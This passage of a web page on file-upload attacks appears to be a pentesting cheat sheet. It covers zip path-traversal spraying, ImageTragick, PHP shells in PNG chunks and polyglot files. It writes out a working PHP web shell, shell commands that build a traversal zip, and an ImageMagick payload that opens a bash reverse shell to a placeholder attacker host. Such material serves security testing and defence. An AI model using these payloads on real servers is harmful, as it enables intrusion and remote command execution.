</code></pre></div></div> <p><strong>Abusing compression for file spraying</strong></p> <p>For further details <strong>check the original post in</strong>: <a href="https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/">https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/</a></p> <ol> <li> <p><strong>Creating a PHP Shell</strong>: PHP code is written to execute commands passed through the <code class="language-plaintext highlighter-rouge">$_REQUEST</code> variable.</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])){</span>
    <span class="nv">$cmd</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
    <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
<span class="p">}</span><span class="cp">?&gt;</span>
</code></pre></div> </div> </li> <li> <p><strong>File Spraying and Compressed File Creation</strong>: Multiple files are created and a zip archive is assembled containing these files.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@s2crew:/tmp# <span class="k">for </span>i <span class="k">in</span> <span class="sb">`</span><span class="nb">seq </span>1 10<span class="sb">`</span><span class="p">;</span><span class="k">do </span><span class="nv">FILE</span><span class="o">=</span><span class="nv">$FILE</span><span class="s2">"xxA"</span><span class="p">;</span> <span class="nb">cp </span>simple-backdoor.php <span class="nv">$FILE</span><span class="s2">"cmd.php"</span><span class="p">;</span><span class="k">done
</span>root@s2crew:/tmp# zip cmd.zip xx<span class="k">*</span>.php
</code></pre></div> </div> </li> <li> <p><strong>Modification with a Hex Editor or vi</strong>: The names of the files inside the zip are altered using vi or a hex editor, changing “xxA” to “../” to traverse directories.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>:set modifiable
:%s/xxA/..<span class="se">\/</span>/g
:x!
</code></pre></div> </div> </li> </ol> <h2 id="imagetragic">ImageTragic</h2> <p>Upload this content with an image extension to exploit the vulnerability <strong>(ImageMagick , 7.0.1-1)</strong> (form the <a href="https://www.exploit-db.com/exploits/39767">exploit</a>)</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i &gt;&amp; /dev/tcp/attacker-ip/attacker-port 0&gt;&amp;1|touch "hello)'
pop graphic-context
</code></pre></div></div> <h2 id="embedding-php-shell-on-png">Embedding PHP Shell on PNG</h2> <p>Embedding a PHP shell in the IDAT chunk of a PNG file can effectively bypass certain image processing operations. The functions <code class="language-plaintext highlighter-rouge">imagecopyresized</code> and <code class="language-plaintext highlighter-rouge">imagecopyresampled</code> from PHP-GD are particularly relevant in this context, as they are commonly used for resizing and resampling images, respectively. The ability of the embedded PHP shell to remain unaffected by these operations is a significant advantage for certain use cases.</p> <p>A detailed exploration of this technique, including its methodology and potential applications, is provided in the following article: <a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">“Encoding Web Shells in PNG IDAT chunks”</a>. This resource offers a comprehensive understanding of the process and its implications.</p> <p>More information in: <a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p> <h2 id="polyglot-files">Polyglot Files</h2> <p>Polyglot files serve as a unique tool in cybersecurity, acting as chameleons that can validly exist in multiple file formats simultaneously. An intriguing example is a <a href="https://en.wikipedia.org/wiki/Gifar">GIFAR</a>, a hybrid that functions both as a GIF and a RAR archive. Such files aren’t limited to this pairing; combinations like GIF and JS or PPT and JS are also feasible.</p> <p>The core utility of polyglot files lies in their capacity to circumvent security measures that screen files based on type. Common practice in various applications entails permitting only certain file types for upload—like JPEG, GIF, or DOC—to mitigate the risk posed by potentially harmful formats (e.g., JS, PHP, or Phar files). However, a polyglot, by conforming to the structural criteria of multiple file types, can stealthily bypass these restrictions.</p> <p>Despite their adaptability, polyglots do encounter limitations. For instance, while a polyglot might simultaneously embody a PHAR file (PHp ARchive) and a JPEG, the success of its upload might hinge on the platform’s file extension policies. If the system is stringent about allowable extensions, the mere structural duality of a polyglot may not suffice to guarantee its upload.</p> <p>More information in: <a href="https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a">https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a</a></p> <h2 id="references">References</h2> <ul> <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files</a></li> <li><a href="https://github.com/modzero/mod0BurpUploadScanner">https://github.com/modzero/mod0BurpUploadScanner</a></li> <li><a href="https://github.com/almandin/fuxploider">https://github.com/almandin/fuxploider</a></li> <li><a href="https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html">https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html</a></li> <li><a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></li> <li><a href="https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a">https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a</a></li> </ul> </article> </div> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> &copy; Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>